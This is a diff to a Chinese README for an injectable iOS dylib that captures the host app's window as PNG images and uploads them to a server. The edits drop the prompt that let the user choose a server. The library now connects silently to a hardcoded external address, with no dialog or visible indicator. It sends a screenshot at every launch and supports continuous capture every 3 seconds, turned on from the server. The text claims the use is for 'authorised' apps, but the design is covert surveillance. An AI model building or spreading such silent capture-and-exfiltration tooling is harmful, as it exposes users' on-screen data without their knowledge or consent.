@@ -1,6 +1,6 @@
 # iOS dylib 接入说明
 
-当前实现适用于自有 App，最低 iOS 15.6。dylib 被实际加载后，`+load` 延迟 3 秒在主线程初始化窗口采集器和设备客户端。首次没有保存地址时，只显示一个原生服务器地址输入框；没有设置页、修改入口或其他界面。地址保存后，后续启动静默连接。
+当前实现适用于自有或已授权 App，最低 iOS 15.6。dylib 被实际加载后，`+load` 延迟 3 秒在主线程初始化并连接内置地址 `https://wxjk.jk92.cc`，不读取旧 UserDefaults 地址，不弹框、无悬浮按钮。每次启动或从后台恢复发送一个启动标识，服务端生成有效的 GET_IMAGE 指令，自动上报一张当前 App 窗口 PNG；同一标识的断线重连不会重复创建指令。连续每 3 秒采集仍由后台开启。
 
 ## 构建和加入主项目
 
@@ -16,17 +16,15 @@ python3 scripts/build_ios.py
 
 ## 统一服务器配置
 
-默认由首次输入框获取地址，支持输入 HTTPS URL 或省略协议的域名与端口，省略时补为 HTTPS。确认保存后写入当前 App 的 UserDefaults，后续直接读取；无效地址不能提交。选择稍后设置时不保存，下次启动仍显示这一个输入框。
+默认服务器常量位于 `ios/jk/jk/JKDeviceClient.mm` 的 `DCDefaultServerAddress`。无需地址配置文件或本地输入；不自动重启、退出宿主 App。
 
-连接失败仅更新内部状态并自动重试，不反复弹框。没有修改地址的用户入口。图片采集、上传、重连和指令处理均静默运行。
-
-可选的 `JKMonitor.plist` 用于部署参数，例如注册准入凭据和首次输入框的预填地址。示例在 `ios/Examples/JKMonitor.example.plist`。需要无交互管理部署时可显式设置 `prompt_for_server=false`，以配置中的地址直接连接；正常接入保持默认即可。
+需要授权测试或独立部署时，可选用宿主 `JKMonitor.plist` 或 Info.plist 的 `JKMonitor` 字典显式指定 `server_url`、`enrollment_token`。`startup_capture=false` 可关闭自动首图而保留后台指令控制；正常生产接入无需这些参数。旧版的 `prompt_for_server` 和已保存的地址不再控制启动。
 
 首次上线请求 `/api/v1/device/register`，将安装标识、随机注册秘密、设备 ID 和设备令牌保存在当前 App 的 Keychain，按服务器地址隔离。随机注册秘密在第一次请求前保存，便于服务端安全识别同一次安装的注册重试。下次启动复用设备身份。注册准入凭据由部署策略决定，客户端不会额外弹出凭据输入框；服务端要求凭据时通过部署配置提供。
 
 服务端需实现 [设备通信协议](设备通信协议.md) 中的注册、WSS、同步、命令结果和图片上传。没有生产服务时，连接失败会按退避策略重试，不会伪造在线状态。
 
-主项目也可显式提供运行时配置，适合自动管理部署；这不会创建任何设置页面：
+主项目也可显式提供运行时配置，适合授权管理部署；不会创建任何设置页面：
 
 ```objc
 #import "JKDeviceClient.h"
@@ -37,7 +35,7 @@ python3 scripts/build_ios.py
 
 ## 窗口选择和本地观察
 
-默认从前台活动场景选择唯一 key window。传统非 Scene App 可使用其 AppDelegate 的 key window。多场景项目可在主线程设置自己的窗口提供器：
+默认从前台活动场景选择 App 的可见普通层级窗口，优先唯一 key window；没有 key window 但只有一个可见普通窗口时也可采集，不依赖设置弹窗或另建窗口。传统非 Scene App 使用 AppDelegate 的 window。多场景项目可在主线程设置自己的窗口提供器：
 
 ```objc
 #import "JKWindowCapture.h"
@@ -47,7 +45,7 @@ python3 scripts/build_ios.py
 };
 ```
 
-窗口必须可见且场景为 foregroundActive。每次采集都重新获取窗口；同一窗口中的文字、图片和控件一起绘制为 PNG，不合成其他窗口。
+窗口必须可见且场景为 foregroundActive。每次采集都重新获取窗口；同一窗口中的文字、图片和控件一起绘制为 PNG，不合成其他窗口。不等待下一次 screen update；直接在目标尺寸的画布上渲染，最长边默认 1280，再在串行后台队列编码 PNG。一次只处理一帧，忙时跳过，避免堆积。App 还没有可见窗口时不生成空白图、不阻塞联网；首图指令暂存，窗口出现后重试。Metal、受保护视频等特殊渲染内容仍需单独真机验收。
 
 主项目可监听 `JKWindowCaptureStateNotification`、`JKWindowCaptureFrameNotification` 和 `JKDeviceClientStateNotification`。回调在主线程执行；PNG 可以从通知的 `frame` 对象读取，也可设置 `frameHandler`。帧回调不应执行阻塞网络或大量磁盘操作。
 
@@ -116,9 +114,12 @@ python3 scripts/build_ios.py
 
 ```sh
 python3 scripts/test_ios.py
+python3 scripts/test_startup_ios.py
 ```
 
-测试创建独立模拟器，在自己的测试 App 中验证 UIKit PNG、生命周期暂停恢复、停止和重复指令、任务持久化、TLS 上传、首次 WSS 503、已连接后强制断线、重连不重置帧序号、旧归属指令拒绝、服务端停用、401 停止重试、首次地址输入框和地址跨进程保存。临时测试根证书只安装在该专用模拟器，结束后删除模拟器，不修改主机信任。
+测试创建独立模拟器，在自己的测试 App 中验证 UIKit PNG、生命周期暂停恢复、停止和重复指令、任务持久化、TLS 上传、首次 WSS 503、已连接后强制断线、重连不重置帧序号、旧归属指令拒绝、服务端停用、401 停止重试。临时测试根证书只安装在该专用模拟器，结束后删除模拟器，不修改主机信任。
+
+启动首图集成测试使用独立模拟器和真实 Go 服务，通过宿主显式覆盖本地 HTTPS 地址（不连接生产），验证旧地址被忽略、延迟窗口不阻塞上线、自动首图、后台拒绝采集和恢复后的单张上报。
 
 测试产物保存在 `build/tests`。其中 `active-window.png` 是采集器实际生成的窗口图片；各阶段 JSON 是验收结果。模拟器的非活动测试通过公开生命周期通知触发，真实手机按键熄屏和目标 App 特殊渲染内容仍需真机验收。
 
